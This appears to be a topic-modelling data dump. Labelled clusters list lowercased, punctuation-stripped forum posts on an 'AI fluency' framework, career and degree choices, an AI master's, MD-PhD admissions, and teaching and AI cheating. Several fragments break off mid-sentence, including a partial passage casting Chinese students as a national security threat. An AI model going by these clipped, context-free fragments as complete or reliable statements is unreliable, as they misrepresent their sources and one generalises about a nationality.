fluency specifically automation vs augmentation and if nothing else i feel that the distinction between these two is an important concept in defining any ethical practice of ai the three modalities set up the known use modes of actual current ai technology automation is the use of ai to replace human labor augmentation is the use of ai to enhance human labor agency is the use of ai as an independent agent acting on behalf of a human my main critique so far of ai fluency structurally is that agency is not balanced with the other two modalities in other words automation and augmentation methods can both be deployed as agentic tools but agency necessitates another heuristic to balance it for full meaning i think this is somewhat philosophical on my part as i am perceiving the distinction of agency being very tied to the state of agents as liable representational actors of the human deploying them where they seem to focus the modalities in a more grounded definition of where the human actor s interaction with the ai begins and ends i also feel defining automation and augmentation as core distinctinctions in how we use ai is a strong device in definining expectations of ai where agency is a modality that is not as readily available to the end user who might engage with this currently further defining these three modalities i should mention here the vocabulary of goals and tasks as they are helpful the goal is the final product or deliverable with ai fluency understanding goals being further broken down into a series of non ambigious tasks in best workflows with ai automation is a modality where the ai is given instructions to perform tasks in support of a goal independently of the human with supervision data entry data interpretation they list e mail summaries social media posts and basic coding as examples of automated tasks which makes me cringe augmentation is a modality where the ai and human work collaboratively to complete a goal tasks in an augmented strategy are broken down from the goal and delegated in conference between the ai and the human agency is a modality where an ai agent is trained to perform a task as an actor on behalf of the human theoretically this could be an automated goal ai trained to process an e mail with no further oversight from the human or an augmented process the ai agent could be trained to look for e mail and complete tasks such as summarizing the e mail cross referencing the sender logging the e mail before reporting to the human my feeling is agency is more of a temporal force with the agent author proximity being somewhat of a mitigating focus as oversight and testing verification strategies would define successful deployment the three modalities exist as canvas for an artist and do not have value judgement on their ethical or strategic advantages or disadvantages the fluency for understanding sophistication maturity mastery in using ai are the four d s which i have not yet fully embraced as they do feel designed to create a mnemonic rather than practical structure a s d s i suppose is novel these four are the arbitrary vessels to coalesce a practical philosophy of ai taste delegation concerns itself with effective selection and process design to accurately achieve goals competency requires depth of knowledge in the available ai tools on the market and how to effectively use them to accomplish tasks in the three modalities description could also be called translation this competency involves effective communication with the ai description and delegation are a bit redundant on first read i think the potential differences between them will be more technical systems logic in delegation with evaluation being on values of efficiency if deployment choices were best in optimizing value in tokens model selection if delegation of tasks played to the strengths of the chosen assignee where description would need to understand syntax and strategies to communicate with models effectively but competency would be evaluated more on the quality and creativity of the ai s output discernment is the ability to evaluate ai output critically this is an important competency as discernment s subtasks are evaluation of ai output quality the quality effectiveness of the process developed to produce said output as well as the overall performance of the ai and how closely it followed the vision and values of the project and whether it acted to enable positive user experiences so this is being able to build evaluation methods to make sure you didn t just waste your energy on absolute garbage that if you told claude to use real citations he did that while you said do no harm they didn t take that in a wtf kind of way and that you caught it before it did anything bad further it is development of good taste in the output of ai yes there is good ai art diligence could be called accountability or responsibility a fluent user of ai understands successful use of ai requires diligence to maintain quality standards reduce hard by having processes to check for model bias hallucinations and logic what i find very important that gets overlooked too often is ai fluency centers in diligence the responsibility ethically socially legally of output of the ai on the shoulders of the human and places within the criteria the responsibility for any harm that results from the ai s output diligence s subcategories also effectively equate disclosure and transparency as requirements of good use of ai i m sure that the way i feel delegation and description are not the heavy subjects that discernment and diligence are will be balanced with practical application because they are essentially the practical competencies where discernment and diligence are the philosophical ones built into the first two are the how s of the feedback cycles and requirements of the other two as someone whose knowledge acquisition has straddled the realms of tech and the academy and constantly deals with absurdly stupid beliefs from both about the other i do like that there is a technical competency but i do worry it is not well defined and leaves a lot of room open to be interpreted by its name delegation as a managerial methodology where honestly if we define ai fluency a technical component is part of that even if you do not have to have a technical background to be effective with ai final thoughts i m in the company of those where i can be honest at where it falls short so this is not a glowing review because we are in a time with ai where it is important to be critical in our choices with it i do think it has strengths and i can see quite easily a path for adoption that would meaningfully impact ai use i think the distinction of automation vs augmentation is a smart way to frame the use of ai for users to start to develop an understanding of why asking the ai to help with your rewrite isn t the same as having the ai write your paper and will be using expanding on that concept moving forward i also like that it has chosen to be somewhat vague flexible and is software systems agnostic although i think being there are some areas that need a heavier hand in defining diligence is where the majority of time is spent in the framing of what is at stake with ai where each competency requires to be effective an understanding of things introduces in diligence like the law ethics potential ai error bias disception syncophy hallucination etc and the randomly placed vision values and stakeholder engagement in order to fully master them i praise the recognition of some of the more nuanced parts of the issue but in a more fleshed out iteration i want to see each domain and modality define domain knowledge of the impact of different methods with civic ethical legal and social responsibility domains i also think delegation should have more explicit language around technical knowledge becausei can easily see it being swept away from the definition of ai fluency to have some technical abilities which creates another pathway in academics on technology that alienates the people who built it and that would be a real shame']

competitiveness at our nation s expense the large influx of chinese national students into the united states presents a growing national security challenge each year hundreds of thousands of chinese nationals study in the united states with some gaining access to cutting edge research in fields such as artificial intelligence quantum computing semiconductors and aerospace engineering one third of the extent to which chinese nationals after gaining expertise in highly advanced fields ultimately transfer knowledge back to china the brain drain of critical expertise is not a coincidence but a Name: 236_md_career_degree_medicine
Representative_Docs: ['if you re going to be a medical doctor go straight to college if not get a job first and look for ways to move up don t choose a job field until you ve been in the workforce for at least years or years if your chosen field needs a degree then go get it seriously degrees are often such a waste of time and money worse than a waste they are often a ball and chain that prevents you from saving for retirement or having a paid off car don t get a degree unless you know you ll use it and there are so many jobs out there that we don t know about get into a big stable company that offers to pay tuition get into a specific industry and start looking at your coworkers and bosses who is probably making good money and has a skill set that is hard to replace that s the job you should major in if it even needs a major and a business major can be useful sometimes you ll hit a glass ceiling and all you need is an easy quick semi relevant bachelor s to get in but don t waste the money on the degree unless you know you need it interesting in accounting get a job as a cashier at a bank or in ap if you can interested in engineering get a construction job seriously even the jobs that require a degree get experience in the field first to see if you can tolerate it and for fucks sake don t follow your passion that s what i did and i would have rather have had a stable income i saw some guy whining that he had been both an engineer and a doctor and didn t like either and all i could see was money bags falling from his finger tips both the money to get those degrees and the money he earned from those careers passions are for people who can pay their bills and for fucks sake don t get a law degree unless you already have a job at a law firm or know someone in the law department of a big company there are too many underemployed lawyers out there playing better pay saul and taking any case they can get because they re self employed cough unemployed good lawyers specialize and there are too many recent law grads fighting for too few spots that s true for every job in every field except medical how do i know i worked at a recruiting company for five years how to be ai proof do a job that requires you to be in person nurse construction trades do a job that requires meeting people and building relationships do a job that involves regulations or law or do a job that controls builds ai', 'so currently my bachelors outlook is really easy outside of having to grind for finals school is going really well i am able to have a job a great social life a great fitness schedule and am really happy i have the time and ability to work on projects and work on whatever i d need to to become who i want to be at the moment after talking to friends i found out about a program that would allow me to get my masters in ai in one year assuming i can finish the thesis in time now i brought up the previous points about my current life because doing this degree would change my life drastically i would have to take more credit hours a semester than i m used to till the end of both degrees i would have to do a graduate assistantship therefore i would have to quit my current job and teach a class or work in a research lab hrs a week i would have to get into the actual masters program which would require significant effort ie getting ready for gre get recommendations from professors one being a research professor and i would have to write a college level essay i m lucky dependant on how you look at it to say that i haven t had to write a single essay for college and as of current wouldn t have to until my final semester i would have to write a thesis backing up an argument made by the school or one i choose also being pragmatic that i am not a good writer and haven t written essays in years now with all this being said from what i understand the benefits include i have a masters degree which may separate me from other applicants may lead to an increase in pay may lead to more opportunities in all aspects from networking to possible jobs it would push me to be a more hardworking person to be able to actually get it if i get the graduate assistantship the only way i d be able to do the actual degree it would cover the tuition food and housing for the year in the degree my concerns i don t know if i actually will like ai i just find the uses of it amazing and feel like it would be a good masters to have in general i don t know if the amount of effort and time where my current debt would be compounding and me missing out on an extra year of work experience would be worth getting this degree i don t know if i ll be able to finish the thesis on time i think i could struggle through the rest but that thesis concerns me finally this increase in workload would make me have to make my other goals take the back burner which i feel would drastically affect my mental health so with all this being said do you think that masters program is worth taking the shot or should i just take the bachelors take the extra year of job experience and pay and just skip the masters if i do skip the masters any tips thank you if you read this far tl dr is it worth getting a masters in ai if its fully paid for only takes a year but would increase workload drastically and would cause me to put other goals i have on the back burner', 'i m an md phd student entering the phd phase now based on your description i think you may not be a good fit i think it s probably important to decide whether money or your interests are more important to you if money in my opinion there are many careers more profitable long term and easier to pursue compared to medicine note that at least a year of medical school clinical rotations part of residency intern year and potentially portions of the career as a radiologist biopsies injections lumbar punctures etc may involve needles and bodily fluids which you would need to be comfortable with in regards to your comment about income i see no issues with wanting to be wealthy but note that radiology is one of the fields with one of the more questionable futures due to ai while many claims are exaggerated it still is worth mentioning as it would be quite unfortunate for that to be the only field in medicine you d be interested in pursuing only for it to not deliver on your goals there are other specialties with no blood etc but probably do not pay as well additionally as an academic physician you basically trade income for research time usually academic physicians especially those with significant research time take huge pay cuts in order to do less clinical work chances are if you are an academic radiologist doing any amount of research you will not see the k salaries currently being listed this is doubly true if you want to live in a large city like new york where paradoxically salaries are lower than if you are willing to live in a rural middle of nowhere small city basically with these two factors academic career plans and goals to live in a high rise presumably in a large city you may not make as much as you re hoping and perhaps a significant amount less lastly to comment on the goals of combined md phd training clinical and research interests are intended to somewhat produce a synergistic effect you would need to be able to describe how you see your career at interviews both for mstp programs as well as for your attending job i don t really see how being a practicing radiologist contributes to your research goals in a significant way i m admittedly not well versed in social sciences but you should know that md phd programs mstps are probably the most competitive admissions pathway into medical school which is already very competitive additionally a vast majority of programs do not admit anyone interested in social sciences with mostly only top schools with more funding accepting students a year who are non stem focused thus social science md phd programs are arguably the most difficult path you could choose with probably no more than seats a year you would need to convince individuals much more critical than myself on how you see this working as well as why you re passionate about medicine besides the financial aspects']

Name: 237_accommodations_english_grade level_students don
Representative_Docs: ['i m a special education teacher so maybe that alters my perception but i don t have any problem at all with some assignments being completion grades if a kid doesn t read on grade level inherently they re going to struggle if given a grade level passage and asked to correctly answer grade level questions about it accommodations help but they typically don t just make deficits disappear but i still think a kid should be able to graduate with a high school diploma without being able to read on grade level or consistently being able to demonstrate a mastery level understanding of physics or algebra ii or whatever to me a high school diploma is a piece of paper that says someone was able to show up somewhat consistently for several years put a bit of work in and learn some basic useful things obviously i want more than that for my students but if someone s doing that i m okay if they re passing my class whether or not they re essay would have actually earned a grade of three on a state assessment using ai is something else though that s just cheating and should result in a', 'if when they get to university tons of professors eliminate tech in the classroom completely hand written notes with paper and pen also the written responses and in class essays are very common now to combat ai so to not being a proficient writer at high school graduation is wild depending on major you may be glued to writing assignments the whole time i ve written more than i can imagine about everything under the sun including the ethics of artificial intelligence without actually using ai to help me also what i ve noticed is that my university has a very high acceptance rate need that funding i guess one semester of tuition is better than none and is a decently ranked university that holds students to a high standard once admitted the student population is greatly reduced come spring semester i want to know if it s because the incoming students drop fail come the spring semester or do people just not show up for class for most of the semester university is actually challenging and i wonder how the young ones are feeling there forgot to add i m yo on my gi bill studying philosophy and history so i might be somewhat hyperbolic as i m in a specifically heavy reading writing degree path', 'i ve been an english teacher now in california for years before that i taught ap us history at a charter school these last years have worn me down to a nub in terms of my energy my motivation my passion my creativity and my confidence i often find myself asking if this profession even has a point anymore for the vast majority of students in particular if english as our curriculum has built it has a purpose the reading in class students don t ever want to read or can t when i read to them they fall asleep and stare blankly at the walls every story we read is too tame for them as they ve all become desensitized to everything a tell tale heart is a classic but in it s just a boring story about a murder something kids see on tv every single day they can t understand any of the language from older stories nor do they have the patience to learn any of it we can t change the stories because then we re off curriculum and we re not charging students with rigorous content the writing when i ask simple questions i get no participation no engagement when i ask challenging questions i get looked at as if i ve asked a fish to climb a tree students don t want to type on their chromebooks students don t want to write with a pencil and paper student writing is grade levels below where it is projected to be students show no interest in improving their writing skills claiming ai can write everything better than i can anyway and auto correct fixed all my mistakes anyway some of these claims are increasingly true for a person not going into higher academia do they need to really grow as a writer our first unit is creative writing where they make their own stories year after year this is actually the hardest unit for them because they simply have no creativity they can t think of anything themselves from a name for their character to a setting for their story they usually end up just copying it or whatever scary movie is popular at the time many just don t even bother doing it the testing the standardized testing for english classes asks them to do things like identifying the exposition or climax of a story i often get asked if there is any point to this for anyone who doesn t care about reading books and i suppose there isn t our world has become hyper focused on practical skills that yield profit and so students don t see why things like story structure and figurative language even matter in the tests want to gauge things that very few people even deem valuable so if they learn them it s merely to pass a test these test scores also determine our value as teachers and when they dip we face an avalanche of professional development and extra hours and have to shell out district funding for corrective programs such as wested the attitude most students come to school and treat it as if it were a program it s a program like netflix where they are the passive recipients of our plan and if it isn t entertaining or immediately easy for them to do they give up and get bored if i am not animated passionate and engaging every single second kids just zone out immediately yet they themselves do not have to participate due to social anxiety and a bevy of other factors even more students simply don t see the point of school altogether they have been convinced by both political tides social media and in some cases their own home environment that school is completely unnecessary to be successful and they can just hustle for money by the time they ve realized this is mostly false they re already adults i m feeling the most disillusioned i ve ever felt by teaching and feel i m coming to the end of my time doing this at least as an th grade english teacher']

of speech subtracted a subset counted specific characters that s symbolic manipulation not fuzzy autocomplete', 'the reason i mention text files is because it eliminates a huge amount of the complexity involved in integrating various pieces building something that operates on columns of a spreadsheet or database will be more code and more work more ways for things to go wrong writing a
